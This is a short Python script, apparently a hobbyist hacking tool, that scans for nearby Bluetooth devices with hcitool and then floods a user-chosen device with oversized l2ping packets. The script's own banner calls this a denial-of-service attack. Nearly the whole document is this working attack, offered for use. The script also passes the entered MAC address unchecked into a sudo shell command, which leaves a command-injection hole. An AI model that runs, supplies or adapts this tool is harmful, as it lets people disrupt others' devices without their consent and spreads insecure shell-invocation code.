import os

print("""This is a simple python code that runs for you hcitool and l2ping in a simplier mode, its designed to run in linux based systems. This code DoS bluetooth devices. 
[Make sure u have the bluetooth running.]{ RUN THE PYTHON FILE AS SUDO , h2ping needs it }
-made by p0rtwalker""")

scanning = input("Do you want to scan for bluetooth devices? ( Y / N ): ").lower()
def running_hcitool():
        if scanning == "y":
            print("scanning for bluetooth devices started...wait")
            os.system("hcitool scan")
            print("         MAC ADDRESS 	&	DEVICE NAME (If u don't see any device then run again")
            scan_again = input("do you want to scan again? ( Y / N ) ").lower()
            while scan_again == "y":
                print("           MAC ADDRESS 	  	DEVICE NAME (If u don't see any device then run again")
                os.system("hcitool scan")
                print("          MAC ADDRESS 	 	DEVICE NAME")
                scan_again = input("do you want to scan again? ( Y / N ) ").lower()
        else:
            print("exiting. (you have to write Y for yes if you want to scan for bluetooth devices)")
            exit(0)

def running_l2ping():
    MAC = input("enter the MAC address of the device you want to DoS attack: ")
    print("press ctrl + c to stop it")
    os.system(f"sudo l2ping -i hci0 -s 600 {MAC}")

running_hcitool()
running_l2ping()

print("we're done.")

